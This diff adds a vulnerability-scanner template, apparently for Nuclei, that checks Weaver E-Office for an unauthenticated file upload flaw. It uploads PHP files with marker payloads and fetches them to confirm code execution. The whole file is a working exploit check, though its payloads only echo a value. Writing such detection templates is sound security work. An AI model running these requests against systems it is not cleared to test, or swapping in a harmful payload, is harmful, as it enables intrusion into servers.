@@ -1,0 +1,86 @@
+id: weaver-e-office-file-upload
+info:
+  name: Weaver E-Office File Upload Vulnerability
+  author: lei_sec
+  severity: critical
+  description: |
+    Identifies a file upload vulnerability in Weaver E-Office that allows arbitrary file upload and execution.
+  reference:
+    - https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125638
+variables:
+  r1: '{{rand_text_alpha(4)}}'
+  r2: '{{rand_int(40000, 44800)}}'
+  r3: '{{rand_text_alpha(20)}}'
+  r4: '{{rand_text_alpha(20)}}'
+  rboundary: '{{rand_text_alpha(8)}}'
+http:
+  - id: upload-test-1
+    method: POST
+    path:
+      - "{{BaseURL}}/webservice/upload/upload.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="file"; filename="{{r1}}.php4"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{r2}});unlink(__FILE__);?>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: path
+        regex:
+          - '"(?P<path>.+)"'
+        internal: true
+  - id: verify-upload-1
+    method: GET
+    path:
+      - "{{BaseURL}}/attachment/{{path}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "{{md5(to_string(r2))}}"
+  - id: upload-test-2
+    method: POST
+    path:
+      - "{{BaseURL}}/webservice/upload.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="file"; filename="{{r3}}.php4."
+      Content-Type: application/octet-stream
+
+      <?php echo "{{r4}}";?>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: path
+        regex:
+          - '"(?P<number>\\d+)\\*.*\\.php4."'
+        internal: true
+  - id: verify-upload-2
+    method: GET
+    path:
+      - "{{BaseURL}}/attachment/{{path}}/{{r3}}.php4"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r4}}"
